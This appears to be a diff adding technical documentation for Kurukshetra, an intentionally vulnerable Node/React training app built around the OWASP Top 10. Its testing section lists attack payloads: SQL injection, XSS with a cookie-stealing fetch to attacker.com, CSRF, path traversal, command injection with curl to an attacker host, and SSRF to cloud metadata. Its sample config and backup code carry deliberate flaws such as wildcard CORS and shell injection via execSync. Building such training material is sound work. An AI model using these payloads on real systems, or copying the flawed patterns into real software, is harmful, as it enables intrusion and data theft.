@@ -1,0 +1,732 @@
+# Kurukshetra - Technical Documentation
+
+<div align="center">
+    <img src="https://via.placeholder.com/150?text=Kurukshetra" alt="Kurukshetra Logo" />
+    <p><em>An intentionally vulnerable web application for cybersecurity training</em></p>
+    <p><strong>Version 1.0</strong> | Last Updated: 2023</p>
+</div>
+
+> **⚠️ IMPORTANT NOTICE**
+>
+> This application contains **INTENTIONAL** security vulnerabilities for educational purposes only.
+> 
+> **DO NOT** deploy in production environments, expose to public networks, or use with sensitive data.
+
+## 📋 Table of Contents
+
+- [Overview](#overview)
+- [Architecture](#architecture)
+    - [Technology Stack](#technology-stack)
+    - [Key Components](#key-components)
+- [Database Schema](#database-schema)
+- [Security Vulnerabilities](#security-vulnerabilities)
+- [API Endpoints](#api-endpoints)
+- [Configuration](#configuration)
+- [Deployment](#deployment)
+- [Testing](#testing)
+- [Security Considerations](#security-considerations)
+- [Contributing](#contributing)
+- [License](#license)
+- [Additional Documentation](#additional-documentation)
+
+## Overview
+
+Kurukshetra is an intentionally vulnerable web application designed for cybersecurity training with a focus on the OWASP Top 10 (2021) vulnerabilities. It provides a realistic environment for security professionals and students to practice penetration testing and vulnerability assessment.
+
+## Architecture
+
+### Technology Stack
+
+| Component | Technology |
+|-----------|------------|
+| **Frontend** | React.js 18.x, Bootstrap 5.2.3 |
+| **Backend** | Node.js 16.x, Express.js 4.x |
+| **Databases** | SQLite3 (primary), MongoDB (NoSQL examples) |
+| **Authentication** | JWT-based with optional 2FA |
+| **File Storage** | Local filesystem |
+| **API Documentation** | Swagger/OpenAPI |
+
+### Key Components
+
+#### Frontend Structure
+
+```
+client/
+├── public/           # Static files
+├── src/
+│   ├── components/   # React components
+│   │   ├── admin/    # Admin panel components
+│   │   ├── auth/     # Authentication components
+│   │   ├── layout/   # Layout components
+│   │   └── ...
+│   ├── context/      # React Context providers
+│   ├── App.js        # Main application component
+│   └── index.js      # Application entry point
+```
+
+#### Backend Structure
+
+```
+server/
+├── config/           # Configuration files
+├── middleware/       # Express middleware
+├── routes/           # API routes
+├── utils/            # Utility functions
+└── index.js          # Server entry point
+```
+
+## Database Schema
+
+<details>
+<summary>Click to expand database schema details</summary>
+
+### SQLite Tables
+
+#### 1. Users
+
+```sql
+CREATE TABLE users (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        username TEXT UNIQUE NOT NULL,
+        email TEXT UNIQUE NOT NULL,
+        password TEXT NOT NULL,
+        role TEXT DEFAULT 'user',
+        api_key TEXT,
+        mfa_secret TEXT,
+        mfa_enabled INTEGER DEFAULT 0,
+        reset_token TEXT,
+        reset_expires TEXT,
+        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+);
+```
+
+#### 2. Products
+
+```sql
+CREATE TABLE products (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        name TEXT NOT NULL,
+        description TEXT,
+        price REAL NOT NULL,
+        category TEXT,
+        stock INTEGER DEFAULT 0,
+        image_url TEXT
+);
+```
+
+#### 3. Orders
+
+```sql
+CREATE TABLE orders (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        user_id INTEGER,
+        total REAL NOT NULL,
+        status TEXT DEFAULT 'pending',
+        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+        FOREIGN KEY(user_id) REFERENCES users(id)
+);
+```
+
+#### 4. Feedback
+
+```sql
+CREATE TABLE feedback (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        user_id INTEGER,
+        content TEXT NOT NULL,
+        rating INTEGER,
+        approved INTEGER DEFAULT 0,
+        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+        FOREIGN KEY(user_id) REFERENCES users(id)
+);
+```
+
+#### 5. Files
+
+```sql
+CREATE TABLE files (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        user_id INTEGER,
+        filename TEXT NOT NULL,
+        path TEXT NOT NULL,
+        type TEXT,
+        size INTEGER,
+        uploaded_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+        FOREIGN KEY(user_id) REFERENCES users(id)
+);
+```
+
+#### 6. Security Questions
+
+```sql
+CREATE TABLE security_questions (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        user_id INTEGER,
+        question TEXT NOT NULL,
+        answer TEXT NOT NULL,
+        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+        FOREIGN KEY(user_id) REFERENCES users(id)
+);
+```
+
+#### 7. Webhooks
+
+```sql
+CREATE TABLE webhooks (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        user_id INTEGER NOT NULL,
+        name TEXT NOT NULL,
+        url TEXT NOT NULL,
+        events TEXT NOT NULL,
+        secret TEXT,
+        active INTEGER DEFAULT 1,
+        last_triggered DATETIME,
+        failure_count INTEGER DEFAULT 0,
+        FOREIGN KEY(user_id) REFERENCES users(id)
+);
+```
+
+#### 8. Vulnerability Progress
+
+```sql
+CREATE TABLE vulnerability_progress (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        user_id INTEGER NOT NULL,
+        category TEXT NOT NULL,
+        vulnerability TEXT NOT NULL,
+        completed INTEGER DEFAULT 0,
+        completed_at DATETIME,
+        notes TEXT,
+        points INTEGER DEFAULT 0,
+        FOREIGN KEY(user_id) REFERENCES users(id)
+);
+```
+
+#### 9. System Logs
+
+```sql
+CREATE TABLE system_logs (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
+        level TEXT NOT NULL,
+        message TEXT NOT NULL,
+        user_id INTEGER,
+        ip_address TEXT,
+        user_agent TEXT,
+        FOREIGN KEY(user_id) REFERENCES users(id)
+);
+```
+
+#### 10. User Sessions
+
+```sql
+CREATE TABLE sessions (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        user_id INTEGER NOT NULL,
+        token TEXT NOT NULL,
+        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+        expires_at DATETIME NOT NULL,
+        ip_address TEXT,
+        user_agent TEXT,
+        FOREIGN KEY(user_id) REFERENCES users(id)
+);
+```
+</details>
+
+## Security Vulnerabilities
+
+<details>
+<summary>Click to expand security vulnerabilities</summary>
+
+### A01:2021 - Broken Access Control
+
+1. **IDOR Vulnerabilities**
+     - `/api/users/:id` - No ownership verification
+     - `/api/files/:id` - Direct object reference
+     - `/api/webhooks/:id` - Missing access control
+
+2. **Missing Function Level Access Control**
+     - Admin endpoints accessible to regular users
+     - API routes lacking role checks
+
+### A02:2021 - Cryptographic Failures
+
+1. **Weak Password Storage**
+     - Passwords stored using MD5 hash
+     - No salting implemented
+
+2. **Insecure Communication**
+     - Missing HTTPS requirement
+     - Sensitive data in localStorage
+
+### A03:2021 - Injection
+
+1. **XXE Injection**
+     - XML parsing without entity validation
+     - Product import functionality vulnerable to XXE
+     - File upload functionality accepting XML files
+
+2. **Command Injection**
+     - System information endpoint using exec
+     - Backup functionality using tar command
+     - Log file processing using system commands
+
+### A04:2021 - Insecure Design
+
+1. **Rate Limiting Bypass**
+     - No rate limiting on login attempts
+     - API key generation without cooldown
+     - Password reset without verification
+
+2. **Weak Recovery Mechanism**
+     - Simple security questions without MFA
+     - Password reset tokens with long validity
+     - Predictable token generation
+
+### A05:2021 - Security Misconfiguration
+
+1. **Debug Endpoints**
+     - Development endpoints left enabled
+     - Stack traces exposed to users
+     - Admin functions accessible via URL
+
+2. **CORS Misconfiguration**
+     - Overly permissive CORS policy
+     - Credentials allowed from any origin
+     - Missing origin validation
+</details>
+
+## API Endpoints
+
+<details>
+<summary>Click to expand API endpoint documentation</summary>
+
+### Authentication
+```
+POST /api/auth/register
+POST /api/auth/login
+POST /api/auth/reset-password
+POST /api/auth/logout
+```
+
+### User Management
+```
+GET    /api/users/profile
+PUT    /api/users/profile
+POST   /api/users/api-key
+DELETE /api/users/api-key
+```
+
+### File Operations
+```
+POST   /api/files/upload          Upload new file
+GET    /api/files/:id/download    Download file
+DELETE /api/files/:id             Delete file
+GET    /api/files/list            List user's files
+```
+
+### Webhook Management
+```
+POST   /api/webhooks/create       Create new webhook
+GET    /api/webhooks/list         List webhooks
+POST   /api/webhooks/:id/test     Test webhook
+DELETE /api/webhooks/:id          Delete webhook
+POST   /api/webhooks/configure    Configure webhook endpoint
+```
+
+### Security Operations
+```
+POST   /api/mfa/setup             Initialize 2FA
+POST   /api/mfa/verify            Verify 2FA token
+POST   /api/mfa/disable           Disable 2FA
+GET    /api/mfa/status            Get 2FA status
+```
+
+### Progress Tracking
+```
+GET    /api/progress/summary      Get vulnerability progress
+POST   /api/progress/complete     Mark vulnerability as complete
+POST   /api/progress/reset        Reset progress tracking
+GET    /api/progress/categories   List vulnerability categories
+```
+
+### System Operations
+```
+GET    /api/admin/system/stats    Get system statistics
+GET    /api/admin/logs            Get system logs
+POST   /api/admin/backup          Create system backup
+GET    /api/admin/config          Get system configuration
+```
+
+### Security Questions
+```
+POST   /api/security-questions/setup    Set security questions
+POST   /api/security-questions/verify   Verify answers
+GET    /api/security-questions/list     List questions
+```
+</details>
+
+## Configuration
+
+### Environment Variables
+
+```bash
+# Server Configuration
+PORT=5000
+NODE_ENV=development
+
+# Database Configuration
+DB_PATH=./database.db
+MONGODB_URI=mongodb://localhost:27017/kurukshetra
+
+# JWT Configuration
+JWT_SECRET=insecure_jwt_secret
+```
+
+### Security Flags
+
+```bash
+# Enable/Disable Vulnerability Categories
+ENABLE_BROKEN_ACCESS_CONTROL=true
+ENABLE_WEAK_CRYPTO=true
+ENABLE_SQL_INJECTION=true
+```
+
+### Security Configurations
+
+<details>
+<summary>Click to expand security configuration details</summary>
+
+#### JWT Configuration
+```javascript
+const jwtConfig = {
+    algorithm: 'HS256',
+    expiresIn: '24h',
+    issuer: 'kurukshetra',
+    audience: 'kurukshetra-client'
+};
+```
+
+#### Cookie Configuration
+```javascript
+const cookieConfig = {
+    httpOnly: false,  // A02: Intentionally vulnerable
+    secure: false,    // A02: Intentionally vulnerable
+    sameSite: 'lax',
+    maxAge: 86400000 // 24 hours
+};
+```
+
+#### CORS Configuration
+```javascript
+const corsConfig = {
+    origin: '*',           // A05: Intentionally misconfigured
+    credentials: true,     // A05: Intentionally misconfigured
+    exposedHeaders: '*',   // A05: Intentionally misconfigured
+    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS']
+};
+```
+
+#### Security Headers
+```javascript
+const securityHeaders = {
+    'Content-Security-Policy': "default-src 'self'", // A05: Intentionally basic
+    'X-Frame-Options': 'DENY',
+    'X-Content-Type-Options': 'nosniff',
+    'X-XSS-Protection': '0', // A05: Intentionally disabled
+    'Referrer-Policy': 'no-referrer-when-downgrade'
+};
+```
+</details>
+
+## Deployment
+
+### Docker Deployment
+
+```bash
+# Build the image
+docker build -t kurukshetra .
+
+# Run the container
+docker run -p 5000:5000 \
+    -e NODE_ENV=production \
+    -e JWT_SECRET=your_secret \
+    -e ADMIN_PASSWORD=your_admin_password \
+    kurukshetra
+```
+
+### Manual Deployment
+
+```bash
+# Install dependencies
+npm install
+cd client && npm install
+
+# Build frontend
+cd client && npm run build
+
+# Start server
+npm start
+```
+
+### Local Development
+
+```bash
+# Install dependencies
+npm install
+cd client && npm install
+
+# Set up environment
+cp .env.example .env
+# Edit .env with your settings
+
+# Initialize database
+npm run setup
+
+# Start development servers
+npm run dev
+```
+
+## Testing
+
+<details>
+<summary>Click to expand testing documentation</summary>
+
+### Vulnerability Testing
+
+Each vulnerability category includes specific test cases and exploitation scenarios.
+
+#### SQL Injection Testing
+
+```sql
+# Example test cases
+username: admin' --
+password: anything
+
+# Union-based injection
+username: ' UNION SELECT 1,2,3,4,5,6,7,8,9 FROM users --
+```
+
+#### XSS Testing
+
+```javascript
+// Reflected XSS Test Cases
+?search=<script>alert(1)</script>
+?user=<img src=x onerror=alert('XSS')>
+?redirect=javascript:alert(document.cookie)
+
+// Stored XSS Test Cases
+const payload = `<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>`;
+const imgPayload = `<img src=x onerror="alert(document.domain)">`;
+```
+
+#### CSRF Testing
+
+```html
+<!-- CSRF Test Form -->
+<form action="http://localhost:5000/api/users/update" method="POST">
+        <input type="hidden" name="email" value="attacker@evil.com">
+        <input type="submit" value="Click me">
+</form>
+```
+
+#### Path Traversal Testing
+
+```javascript
+// Path Traversal Test Cases
+filename=../../../../etc/passwd
+filename=..%2F..%2F..%2F..%2Fetc%2Fpasswd
+filename=....//....//....//....//etc/passwd
+filename=%252e%252e%252fetc%252fpasswd
+```
+
+#### Command Injection Testing
+
+```bash
+# Basic tests
+; ls -la
+& whoami
+| cat /etc/passwd
+` id `
+$(curl http://attacker.com)
+```
+
+#### SSRF Testing
+
+```python
+# Test Cases
+http://localhost:8080
+file:///etc/passwd
+http://169.254.169.254/latest/meta-data/
+dict://attacker.com:11111/
+gopher://attacker.com:11111/_
+```
+
+#### Authentication Testing
+
+```javascript
+// Token tests
+const tokenTests = {
+    expired: 'eyJ0...expired_token',
+    malformed: 'invalid.token.format',
+    none: 'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0',
+    tampered: 'eyJ0...modified_payload'
+};
+
+// 2FA bypass tests
+const mfaBypassTests = [
+    '',
+    '000000',
+    'BYPASS2FA',
+    previousToken,
+    null
+];
+```
+</details>
+
+## Security Considerations
+
+### Warning
+
+This application contains intentional security vulnerabilities and should **never** be:
+- Deployed to production environments
+- Exposed to the public internet
+- Used with real or sensitive data
+
+### Recommended Setup
+
+- Use in isolated development environment
+- Deploy behind VPN/firewall
+- Use dummy/test data only
+- Monitor system resources
+
+## Contributing
+
+### Development Workflow
+
+1. Fork the repository
+2. Create feature branch
+3. Implement changes
+4. Submit pull request
+
+### Coding Standards
+
+- Follow ESLint configuration
+- Maintain intentional vulnerabilities
+- Document new security issues
+- Add test cases
+
+## License
+
+MIT License - See LICENSE file for details
+
+## Additional Documentation
+
+<details>
+<summary>Click to expand error handling documentation</summary>
+
+### Client-Side Error Handling
+
+```javascript
+const handleApiError = (error) => {
+    if (error.response) {
+        // Server responded with error
+        return error.response.data.error || 'Server error occurred';
+    } else if (error.request) {
+        // Request made but no response
+        return 'No response from server';
+    } else {
+        // Request setup error
+        return 'Failed to make request';
+    }
+};
+```
+
+### Server-Side Error Handling
+
+```javascript
+const errorHandler = (err, req, res, next) => {
+    // Log error details
+    console.error({
+        message: err.message,
+        stack: err.stack,
+        timestamp: new Date().toISOString(),
+        url: req.url,
+        method: req.method,
+        ip: req.ip
+    });
+
+    // Send response
+    res.status(err.status || 500).json({
+        error: process.env.NODE_ENV === 'development' ? err.message : 'Internal server error'
+    });
+};
+```
+</details>
+
+<details>
+<summary>Click to expand monitoring and backup documentation</summary>
+
+### Monitoring and Logging
+
+#### Winston Logger Configuration
+
+```javascript
+const winston = require('winston');
+
+const logger = winston.createLogger({
+    level: 'info',
+    format: winston.format.json(),
+    defaultMeta: { service: 'kurukshetra' },
+    transports: [
+        new winston.transports.File({ filename: 'error.log', level: 'error' }),
+        new winston.transports.File({ filename: 'combined.log' })
+    ]
+});
+```
+
+#### System Monitoring
+
+```javascript
+const monitoring = {
+    checkSystemHealth: async () => {
+        const stats = {
+            cpuUsage: process.cpuUsage(),
+            memoryUsage: process.memoryUsage(),
+            uptime: process.uptime(),
+            activeConnections: await getActiveConnections(),
+            pendingRequests: await getPendingRequests()
+        };
+        return stats;
+    }
+};
+```
+
+### Backup and Recovery
+
+#### Database Backup
+
+```javascript
+const backup = {
+    createBackup: async () => {
+        const timestamp = new Date().toISOString().replace(/[:\.]/g, '-');
+        const backupPath = path.join(__dirname, 'backups', `backup-${timestamp}.sql`);
+        
+        // A03: Command Injection vulnerability
+        execSync(`sqlite3 database.db .dump > ${backupPath}`);
+        return backupPath;
+    }
+};
+```
+
+#### Recovery Process
+
+```javascript
+const recovery = {
+    restoreFromBackup: async (backupFile) => {
+        // A03: Path Traversal vulnerability
+        execSync(`sqlite3 database.db < ${backupFile}`);
+    }
+};
+```
+</details>
